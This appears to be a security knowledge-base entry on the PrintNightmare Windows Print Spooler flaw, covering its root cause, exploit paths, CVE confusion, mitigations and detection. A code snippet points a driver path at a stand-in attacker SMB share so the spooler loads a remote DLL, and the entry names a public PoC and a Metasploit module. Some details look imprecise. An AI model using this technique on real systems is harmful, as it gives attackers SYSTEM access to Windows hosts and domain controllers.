# PrintNightmare (CVE-2021-34527)

## Classification
- **CVE**: CVE-2021-34527 (original), CVE-2021-1675 (variant)
- **CVSS 3.1**: 8.8 (High) — Remote Code Execution
- **Type**: Windows Print Spooler — Arbitrary DLL Load / Privilege Escalation
- **Affected**: All Windows versions (Win7 through Win10 21H1, Server 2008 through 2019)
- **Discoverers**: Accenture Security (Zhipeng Huo, Piotr Madej) — also independently found by Microsoft

## Root Cause

Windows Print Spooler (spoolsv.exe) runs as SYSTEM. It loads printer driver DLLs from locations specified in the registry. The vulnerability: an unprivileged user can call `RpcAddPrinterDriverEx()` or `RpcAddPrinterDriver()` to point the spooler to a **malicious DLL hosted on a network share (SMB)** . The spooler loads the DLL as SYSTEM — no privilege check.

```csharp
// Simplified RPC call from RpcAddPrinterDriver
// The driver .inf file can specify arbitrary DLL path
// Windows 10's built-in "Point and Print" logic:

DRIVER_INFO_2 driverInfo;
driverInfo.pDriverPath = "\\\\attacker\\share\\evil.dll";  // Network path!
driverInfo.pDataFile = "C:\\Windows\\System32\\localspl.dll";

// spoolsv.exe calls LoadLibrary(driverInfo.pDriverPath)
// → "\\\\attacker\\share\\evil.dll" is loaded
// → DllMain runs as SYSTEM
// → PRIVILEGE ESCALATION
```

## Exploit Chain

**Option A: Remote (Domain Environment)**
1. Attacker has access to a domain-joined workstation
2. Calls `RpcAddPrinterDriverEx()` via MS-RPRN RPC to a Domain Controller's print spooler
3. Points to attacker's SMB share hosting malicious DLL
4. DC's spoolsv.exe loads the DLL → **SYSTEM on the Domain Controller**

**Option B: Local (Privilege Escalation)**
1. Attacker has limited user access on Windows
2. Calls local Spooler to load DLL from attacker's folder
3. DLL executes as SYSTEM → full admin access

**Option C: Remote (Workstation)**
1. Same as Option A but targeting any Windows workstation with Print Spooler running
2. Remote code execution as SYSTEM

## Detection / Mitigation Confusion

PrintNightmare is notable for the confusion around which CVE does what:
- **CVE-2021-34527**: The "real" PrintNightmare — remote code execution + privilege escalation by unauthenticated/unauthorized users. This was what the researchers reported but Microsoft tried to downplay as CVE-2021-1675
- **CVE-2021-1675**: Microsoft claimed this was a LPE only — but the researchers proved it was RCE across domains
- Microsoft initially released an incomplete patch, then had to re-release multiple times

## Pattern Recognition

1. **SYSTEM service loading user-specified DLLs**: Any service that accepts a DLL path from an untrusted caller is dangerous
2. **Point and Print abuse**: Windows "trusted" network paths for driver installation but forgot to validate
3. **Default service enabled**: Print Spooler runs on every Windows by default — huge attack surface
4. **RPC interface exposed**: MS-RPRN is accessible from unauthenticated remote callers in domain environments
5. **Incomplete patches**: The multiple patch iterations show the complexity of correctly fixing privilege issues

## Variants
- **CVE-2021-34481**: Another Print Spooler RCE (June 2021)
- **CVE-2021-36958**: Yet another Print Spooler RCE found in Aug 2021
- Print Spooler continues to be a rich source of bugs (CVE-2022-22718, CVE-2023-38186, etc.)

## Mitigation Status
- **Disable service**: `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`
- **GPO**: Disallow inbound remote spooler connections (Computer Config → Admin Templates → Printers)
- **Patch**: Multiple cumulative updates through 2021-2022
- **2026 status**: Print Spooler still has CVEs found regularly; disabling it when not needed is recommended

## PoC & References
- **Original**: github.com/afwu/PrintNightmare (CVE-2021-34527 Python PoC)
- **Metasploit**: exploit/windows/misc/printnightmare
- **CISA**: Emergency Directive ED 21-04 (Patch PrintNightmare)
- **Detection**: Event ID 316 (spooler loaded driver), SMB traffic to unknown shares
- **Microsoft response timeline**: MSRC blog post tracking patch iterations
